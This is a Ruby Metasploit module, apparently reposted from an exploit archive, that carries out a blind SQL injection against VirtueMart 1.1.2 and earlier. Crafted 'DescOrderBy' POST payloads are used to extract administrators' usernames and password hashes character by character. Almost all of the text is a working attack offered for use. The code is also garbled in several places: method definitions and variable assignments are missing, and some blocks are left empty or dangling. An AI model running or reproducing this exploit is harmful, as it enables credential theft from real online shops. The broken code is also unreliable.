VirtueMart <= 1.1.2 Remote SQL Injection Exploit (meta)
=======================================================


require &#039;msf/core&#039;

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,	
			&#039;Name&#039;           => &#039;VirtueMart <= 1.1.2 Sql Injection Exploit&#039;,
			&#039;Description&#039;    => %q{
					This module exploits VirtueMart <= 1.1.2 Blind Sql Injection vulnerability.
			},
			&#039;Author&#039;         => &#039;Janek Vind "waraxe" <come2waraxe[at]yahoo.com>&#039;,
			&#039;License&#039;        => MSF_LICENSE,
			&#039;Version&#039;        => &#039;1.0&#039;,
			&#039;References&#039;     =>
				[
					[&#039;BID&#039;, &#039;33480&#039;],
					[&#039;URL&#039;, &#039;http://www.waraxe.us/advisory-71.html&#039;],
					[&#039;URL&#039;, &#039;http://secunia.com/advisories/33671/&#039;]
				],
			&#039;DisclosureDate&#039; => &#039;Jan 24 2009&#039;))

			register_options(
				[
					OptString.new(&#039;URI&#039;, [false, &#039;Path to VirtueMart&#039;, &#039;&#039;]),
					OptInt.new(&#039;TARGETID&#039;, [false, &#039;Target ID (optional)&#039;]),
					OptBool.new(&#039;ALLSA&#039;, [ false,  &#039;Fetch all Super Admins&#039;, true]),
					OptBool.new(&#039;ALLA&#039;, [ false,  &#039;Fetch all Admins&#039;, false]),
					OptBool.new(&#039;ALLM&#039;, [ false,  &#039;Fetch all Managers&#039;, false]),
				], self.class)
			
	end

	def run

		@marker = &#039;name="addtocart"&#039;
		@target_uri = &#039;/&#039; + datastore[&#039;URI&#039;] + &#039;/&#039;
		@target_uri = @target_uri.gsub(/\/{2,}/, &#039;/&#039;)
		@target_id = datastore[&#039;TARGETID&#039;] 
		@requests = @fetched = 0
		time_start = Time.now.to_i
		
		# debug_level=2 - more debug messages, 1 - less
		@debug_level = 1
		
			return
		end

		if(datastore[&#039;ALLSA&#039;])
			if(!get_users(1))
				print_error(&#039;Exploit failed fetching Super Admins&#039;)
				return
			end
		end
		
		if(datastore[&#039;ALLA&#039;])
			if(!get_users(2))
				print_error(&#039;Exploit failed fetching Admins&#039;)
				return
			end
		end
		
		if(datastore[&#039;ALLM&#039;])
			if(!get_users(3))
				print_error(&#039;Exploit failed fetching Managers&#039;)
				return
			end
		end
		
		if((@target_id < 1) and (!datastore[&#039;ALLSA&#039;]) and (!datastore[&#039;ALLA&#039;]) and (!datastore[&#039;ALLM&#039;]))
			print_status(&#039;Target ID or group(s) not specified, fetching Super Admins as default&#039;)
			if(!get_users(1))
				print_error(&#039;Exploit failed fetching Super Admins&#039;)
				return
			end
		end
		
		if(@target_id > 1)
			if(!get_user())
				print_error("Exploit failed fetching user with ID=#{@target_id}")
				return
			end
		end
		
		time_spent = Time.now.to_i - time_start
		
		print_status("Exploitation results:")
		print_status("Got data for  #{@fetched} users")
		print_status("Total time spent: #{time_spent} seconds")
		print_status("HTTP requests needed: #{@requests}")
		
	end
	############################################################
	def make_post(post_data)
		
		timeout = 30
		
		begin	
		
			res = send_request_cgi({
				&#039;uri&#039;     => @target_uri,
				&#039;method&#039;  => &#039;POST&#039;,
				&#039;data&#039;  => post_data,
			}, timeout)
			
			if(res and res.body)
				@requests += 1
				return res.body
			else
				print_error(&#039;No response from server&#039;)
				return nil
			end
			
		rescue ::Exception
			print_error("Error: #{$!.class} #{$!}")
			return nil
		end
	end
	############################################################
	def test_condition(condition)
		
		max_tries = 10

		post_data  = "page=shop.browse&option=com_virtuemart&vmcchk=1&DescOrderBy=,"
		post_data << "IF(#{condition},1,(SELECT 1 UNION ALL SELECT 1))"
		
		1.upto(max_tries) do |i|
			
			buf = make_post(post_data)
			
			if(buf)
				return buf.include?(@marker)
			else
				print_status("Sleeping #{i} seconds")
				sleep(i)
				print_status("Awake, retry ##{i}")
			end
		end
		
		return nil
	end
	############################################################
		
		post_data  = &#039;page=shop.browse&option=com_virtuemart&vmcchk=1&#039;
		buf = make_post(post_data) or return false

		if(!buf.include?(@marker))
			print_error(&#039;Pre-test 1 failed - VirtueMart not detected&#039;)
			return false
		else
			print_status(&#039;Pre-test 1 passed - VirtueMart detected&#039;)
		end

		post_data  = &#039;page=shop.browse&option=com_virtuemart&vmcchk=1&DescOrderBy=,&#039;
		buf = make_post(post_data) or return false

		if(buf.include?(@marker))
			print_error(&#039;Pre-test 2 failed - target is patched?&#039;)
			return false
		else
			print_status(&#039;Pre-test 2 passed - injection detected&#039;)
		end
		
		post_data  = &#039;page=shop.browse&option=com_virtuemart&vmcchk=1&DescOrderBy=,(SELECT 1)&#039;
		buf = make_post(post_data) or return false

		if(!buf.include?(@marker))
			print_error(&#039;Pre-test 3 failed - subselects not supported?&#039;)
			return false
		else
			print_status(&#039;Pre-test 3 passed - subselects supported&#039;)
		end
		
			print_status(&#039;Prefix not provided, trying to fetch&#039;)
				print_error(&#039;Prefix fetch failed&#039;)
				return false
			else
				return true
			end
		end
		
		post_data  = "page=shop.browse&option=com_virtuemart&vmcchk=1&DescOrderBy=," +
			
		buf = make_post(post_data) or return false
		
		if(!buf.include?(@marker))
				print_error(&#039;Prefix fetch failed&#039;)
				return false
			else
				return true
			end
		else
		end
		
		return true
	end
	############################################################
	def get_char(pattern, min, max)
	
		num = get_num(pattern, min, max) or return nil
		
		return num.chr
		
	end
	############################################################
	def get_hash(group = nil, u_pos = nil)
		
		hash = &#039;&#039;
	
		if(group and u_pos)
		else
		end
		
		p_len = get_num(pattern, 32, 100) or return nil
		
		print_status("Got hash length: #{p_len.to_s}")
		
		1.upto(p_len) do |pos|
			print_status("Finding hash char pos #{pos}") if @debug_level > 0
				
			if(group and u_pos)
			else
			end
			
			c = get_char(pattern, 32, 128) or return nil

			hash << c
			print_status("Known: #{hash}") if @debug_level > 0

		end
		
		return hash
		
	end
	############################################################
		
		
		post_data  = &#039;page=shop.browse&option=com_virtuemart&vmcchk=1&DescOrderBy=,&#039; +
			&#039;(SELECT 1 FROM INFORMATION_SCHEMA.TABLES LIMIT 1)&#039;
		buf = make_post(post_data) or return false

		if(!buf.include?(@marker))
			print_error(&#039;INFORMATION_SCHEMA not found - mysql < 5.0?&#039;)
			return false
		else
			print_status(&#039;INFORMATION_SCHEMA detected, proceed&#039;)
		end
		
		pattern = &#039;(SELECT LENGTH(table_name)FROM INFORMATION_SCHEMA.TABLES&#039; +
			&#039; WHERE table_name LIKE 0x25766d5f70726f64756374 ORDER BY table_name ASC LIMIT 0,1)&#039;
		 
		p_len = get_num(pattern, 5, 100) or return nil
		p_len -= 10
		
		if(p_len < 0)
			return false
		elsif(p_len == 0)
			print_status(&#039;Prefix seems to be empty&#039;)
			return true
		else
		end
		
		1.upto(p_len) do |pos|
			
			pattern = "(SELECT ORD(SUBSTR(table_name,#{pos},1))FROM INFORMATION_SCHEMA.TABLES" +
			" WHERE table_name LIKE 0x25766d5f70726f64756374 ORDER BY table_name ASC LIMIT 0,1)"
			
			c = get_char(pattern, 32, 128) or return nil


		end
		
	end
	############################################################
	def get_num(pattern, min = 1, max = 100)
		
		curr = 0;

		while(1)
			
			area = max - min
			if(area < 2 )
				post_data = "#{pattern}=#{max}"
				eq = test_condition(post_data)
			
				if(eq == nil)
					return nil
				elsif(eq)
					len = max
				else
					len = min
				end
				
				break
			end
		
			half = area / 2
			curr = min + half
		
			post_data = "#{pattern}>#{curr}"
		
			bigger = test_condition(post_data)
		
			if(bigger == nil)
				return nil
			elsif(bigger)
				min = curr
			else
				max = curr
			end

			print_status("Current: #{min}-#{max}") if @debug_level > 1
			
		end
		
		return len
		
	end
	############################################################
	def get_username(group = nil, u_pos = nil)
		
		username = &#039;&#039;
		
		if(group and u_pos)
		else
		end
		
		u_len = get_num(pattern, 1, 150) or return nil
		
		print_status("Got username length: #{u_len.to_s}")
		
		1.upto(u_len) do |pos|
			print_status("Finding username char pos #{pos}") if @debug_level > 0
			
			if(group and u_pos)
			else
			end
				
			c = get_char(pattern, 32, 128) or return nil

			username << c
			print_status("Known: #{username}") if @debug_level > 0
			
		end
		
		return username
		
	end
	############################################################
	def get_users(group)
		
		if(group == 1)
			usertype = &#039;0x53757065722041646d696e6973747261746f72&#039;
			print_status(&#039;Starting to fetch all Super Admins&#039;)
		elsif(group == 2)
			usertype = &#039;0x41646d696e6973747261746f72&#039;
			print_status(&#039;Starting to fetch all Admins&#039;)
		else
			usertype = &#039;0x4d616e61676572&#039;
			print_status(&#039;Starting to fetch all Managers&#039;)
		end
		

		u_cnt = get_num(pattern, 0, 100) or return nil
		
		print_status("Targets to fetch: #{u_cnt.to_s}")
		
		0.upto(u_cnt - 1) do |pos|
			
			print_status("Fetching user pos #{pos}")
			
			username = get_username(usertype, pos) or return nil
			hash = get_hash(usertype, pos) or return nil
			@fetched += 1
			
			print_status(
				"Got user data:" +
				"\n==============================\n" +
				"Username: #{username}\n" +
				"Hash: #{hash}" +
				"\n=============================="
			)
			
		end
		
		return true
	end
	############################################################
	def get_user
		
		print_status("Testing user ID=#{@target_id}")
		u_cnt = get_num(pattern, 0, 100) or return nil
		
		if(u_cnt != 1)
			print_error("No user with ID=#{@target_id}")
			return true
		end
		
		print_status("Working with user ID=#{@target_id}")
		
		username = get_username or return nil
		hash = get_hash or return nil
		@fetched += 1
		
		print_status(
			"Got user data:" +
			"\n==============================\n" +
			"Username: #{username}\n" +
			"Hash: #{hash}" +
			"\n=============================="
		)
			
		return true
	end
	############################################################	
end





